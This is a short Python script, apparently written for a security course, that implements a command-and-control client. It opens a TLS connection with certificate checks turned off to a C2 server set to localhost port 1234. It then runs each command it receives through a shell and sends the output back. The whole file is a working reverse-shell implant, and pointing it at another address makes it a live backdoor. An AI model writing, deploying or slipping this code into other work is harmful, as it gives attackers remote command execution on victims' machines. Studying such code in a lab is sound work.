import socket
import subprocess
import ssl   # 🔐 TLS

server_ip = '127.0.0.1'
server_port = 1234

# 🔐 Create TLS context (lab-safe)
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE  # Accept self-signed certs (OK for coursework)

# Create raw socket
raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 🔐 Wrap socket with TLS
client_socket = context.wrap_socket(raw_socket)

# Connect securely
client_socket.connect((server_ip, server_port))
print("[+] Connected securely to C2 Server (TLS).")

while True:
    try:
        # Receive command from C2 server
        command = client_socket.recv(1024).decode()
        if not command:
            break

        print(f"[*] Received command: {command}")

        if command.lower() == 'quit':
            break

        # Execute the command
        try:
            output = subprocess.check_output(
                command,
                shell=True,
                stderr=subprocess.STDOUT,
                text=True
            )
        except subprocess.CalledProcessError as e:
            output = e.output

        if not output:
            output = "[+] Command executed, but no output."

        # Send command output back to server
        print(f"[*] Sending output")
        client_socket.sendall(output.encode())

    except (ConnectionResetError, ssl.SSLError):
        print("[-] Connection lost. Exiting...")
        break

client_socket.close()

